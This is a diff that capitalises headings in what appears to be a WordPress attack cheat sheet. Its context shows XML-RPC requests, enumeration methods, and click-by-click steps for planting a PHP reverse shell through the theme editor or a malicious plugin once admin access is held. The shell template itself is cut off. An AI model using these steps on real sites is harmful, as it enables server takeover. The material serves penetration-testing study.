@@ -1,4 +1,4 @@
-### list possible methods using rpc api
+### List possible methods using rpc api
 ```
 POST /xmlrpc.php HTTP/1.1
 Host: <domain>
@@ -11,7 +11,7 @@ Content-Length: XXX
 </methodCall>  
 ```
 
-### example - send a ping
+### Example - send a ping
 ```
 POST /xmlrpc.php HTTP/1.1
 Host: <domain>
@@ -27,7 +27,7 @@ Content-Length: XXX
 </methodCall>  
 ```
 
-### methods for enumeration
+### Methods for enumeration
 ```
 wp.getUserBlogs
 wp.getCategories
@@ -43,17 +43,17 @@ metaWeblog.getUsersBlogs
 ```
 
 
-### upload reverse shell with admin access - using custom 404 page
+### Upload reverse shell with admin access - using custom 404 page
 ```
 Appearance > Editor/Theme Editor > Theme Files > 404/404 Template > Selected file content > <phpReverseShell> > Update File
 ```
 
-### upload reverse shell with admin access - using malicious plugin
+### Upload reverse shell with admin access - using malicious plugin
 ```
 Plugins > Add New > Upload Plugin > Browse > Choose PHP reverse shell (rev.zip) > Install > Activate Plugin
 ```
 
-### template of PHP reverse shell
+### Template of PHP reverse shell
 ```
 <?php
 /**
